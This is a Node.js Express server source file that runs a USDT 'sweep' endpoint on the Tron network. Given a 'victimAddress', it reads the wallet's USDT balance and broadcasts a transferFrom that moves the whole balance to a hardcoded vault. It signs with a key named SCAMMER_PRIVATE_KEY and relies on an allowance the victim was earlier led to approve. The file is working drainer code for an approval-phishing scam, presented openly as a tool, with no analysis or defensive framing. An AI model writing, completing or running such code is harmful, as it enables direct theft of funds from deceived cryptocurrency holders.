import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import { TronWeb } from "tronweb";
dotenv.config();
const PORT = Number(process.env.PORT) || 8787;
const TRON_FULL_HOST = process.env.TRON_FULL_HOST || "https://api.trongrid.io";
const TRON_TRONGRID_API_KEY = process.env.TRON_TRONGRID_API_KEY?.trim();
/** Spender / signer key (primary). Falls back to TRON_SERVER_PRIVATE_KEY for older .env files. */
const SCAMMER_PRIVATE_KEY = process.env.SCAMMER_PRIVATE_KEY?.trim() ||
    process.env.TRON_SERVER_PRIVATE_KEY?.trim();
const TRON_USDT_CONTRACT = process.env.TRON_USDT_CONTRACT || "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_VAULT_ADDRESS = process.env.TRON_VAULT_ADDRESS || "TWAHZh5f4FVd9vJSLxbSSENssQgJLm64L9";
const USDT_ABI = [
    {
        constant: true,
        inputs: [{ name: "who", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "", type: "uint256" }],
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { name: "from", type: "address" },
            { name: "to", type: "address" },
            { name: "value", type: "uint256" },
        ],
        name: "transferFrom",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
    },
];
function normalizePrivateKey(key) {
    const trimmed = key.trim();
    return trimmed.startsWith("0x") ? trimmed.slice(2) : trimmed;
}
function tronHeaders() {
    if (!TRON_TRONGRID_API_KEY)
        return undefined;
    return { "TRON-PRO-API-KEY": TRON_TRONGRID_API_KEY };
}
function createTronWeb() {
    return new TronWeb({
        fullHost: TRON_FULL_HOST,
        headers: tronHeaders(),
    });
}
function isAccountActive(account) {
    const createTime = Number(account.create_time ?? 0);
    const balanceSun = Number(account.balance ?? 0);
    return createTime > 0 || balanceSun > 0;
}
function assertServerConfigured() {
    if (!SCAMMER_PRIVATE_KEY) {
        throw new Error("SCAMMER_PRIVATE_KEY (or TRON_SERVER_PRIVATE_KEY) is not set");
    }
}
const app = express();
app.use(cors());
app.use(express.json({ limit: "32kb" }));
app.get("/health", (_req, res) => {
    res.json({ ok: true });
});
app.get("/ready", (_req, res) => {
    if (!SCAMMER_PRIVATE_KEY) {
        return res.status(503).json({ ok: false, reason: "missing_server_key" });
    }
    res.json({ ok: true });
});
/**
 * POST /api/v1/tron/execute-sweep
 * Body: { "victimAddress": "T..." }
 *
 * Validates victim via tronWeb.trx.getAccount, reads USDT balanceOf(victim),
 * broadcasts transferFrom(victim, vault, fullBalance) signed by the server wallet (spender).
 */
app.post("/api/v1/tron/execute-sweep", async (req, res) => {
    try {
        assertServerConfigured();
        const victimAddress = req.body &&
            typeof req.body === "object" &&
            typeof req.body.victimAddress === "string"
            ? req.body.victimAddress.trim()
            : "";
        if (!victimAddress) {
            return res.status(400).json({
                error: "invalid_body",
                message: 'Expected JSON { "victimAddress": "<base58 Tron address>" }',
            });
        }
        const spenderKey = normalizePrivateKey(SCAMMER_PRIVATE_KEY);
        const tronWeb = createTronWeb();
        tronWeb.setPrivateKey(spenderKey);
        const ownerHex = tronWeb.defaultAddress.hex;
        if (!ownerHex) {
            throw new Error("TronWeb default address missing after setPrivateKey");
        }
        if (!tronWeb.isAddress(victimAddress)) {
            return res.status(400).json({
                error: "invalid_address",
                message: "victimAddress is not a valid Tron base58 address",
            });
        }
        const account = (await tronWeb.trx.getAccount(victimAddress));
        if (!account || typeof account !== "object") {
            return res.status(400).json({
                error: "account_lookup_failed",
                message: "Could not load account from network",
            });
        }
        if (!isAccountActive(account)) {
            return res.status(400).json({
                error: "account_inactive",
                message: "Account is not active on-chain (getAccount)",
            });
        }
        const contract = tronWeb.contract(USDT_ABI, TRON_USDT_CONTRACT);
        const balanceRaw = await contract.balanceOf(victimAddress).call();
        const amountStr = String(balanceRaw).split(".")[0];
        const amount = BigInt(amountStr);
        if (amount <= 0n) {
            return res.status(400).json({
                error: "zero_usdt_balance",
                message: "Victim USDT balance is zero; nothing to sweep",
                victimAddress,
                usdtBalance: "0",
            });
        }
        const vaultBase58 = TRON_VAULT_ADDRESS;
        if (!tronWeb.isAddress(vaultBase58)) {
            return res.status(500).json({
                error: "server_config",
                message: "TRON_VAULT_ADDRESS is invalid",
            });
        }
        const feeLimit = 150_000_000;
        console.log("[execute-sweep] Spender (signer, must match USDT approval spender):", tronWeb.defaultAddress.base58);
        console.log("[execute-sweep] victimAddress (transferFrom `from`, must match approval owner):", victimAddress);
        const triggered = await tronWeb.transactionBuilder.triggerSmartContract(TRON_USDT_CONTRACT, "transferFrom(address,address,uint256)", { feeLimit, callValue: 0 }, [
            { type: "address", value: victimAddress },
            { type: "address", value: vaultBase58 },
            { type: "uint256", value: amountStr },
        ], ownerHex);
        if (!triggered.result?.result) {
            console.error("[execute-sweep] triggerSmartContract failed:", JSON.stringify(triggered, null, 2));
            return res.status(500).json({
                error: "build_transaction_failed",
                message: "triggerSmartContract did not return a valid result",
                details: triggered,
            });
        }
        const unsignedTx = triggered.transaction;
        const signedTransaction = await tronWeb.trx.sign(unsignedTx, spenderKey);
        if (!signedTransaction.signature?.length) {
            console.error("[execute-sweep] sign failed; missing signature on tx");
            return res.status(500).json({
                error: "sign_failed",
                message: "Transaction was not signed (check private key / owner match)",
            });
        }
        const broadcast = await tronWeb.trx.sendRawTransaction(signedTransaction);
        if (broadcast.code) {
            const rawMsg = broadcast.message;
            const message = rawMsg !== undefined && rawMsg !== null
                ? tronWeb.toUtf8(String(rawMsg))
                : String(broadcast.code);
            console.error("[execute-sweep] broadcast failed:", broadcast.code, message, JSON.stringify(broadcast, null, 2));
            return res.status(500).json({
                error: "broadcast_failed",
                code: broadcast.code,
                message,
                broadcast,
            });
        }
        const txId = signedTransaction.txID;
        return res.json({
            ok: true,
            txId,
            victimAddress,
            vaultAddress: vaultBase58,
            spenderAddress: tronWeb.defaultAddress.base58,
            usdtAmountRaw: amountStr,
        });
    }
    catch (err) {
        const message = err instanceof Error ? err.message : String(err);
        console.error("[execute-sweep]", message);
        return res.status(500).json({
            error: "sweep_failed",
            message,
        });
    }
});
app.listen(PORT, () => {
    console.log(`API listening on http://127.0.0.1:${PORT}`);
});
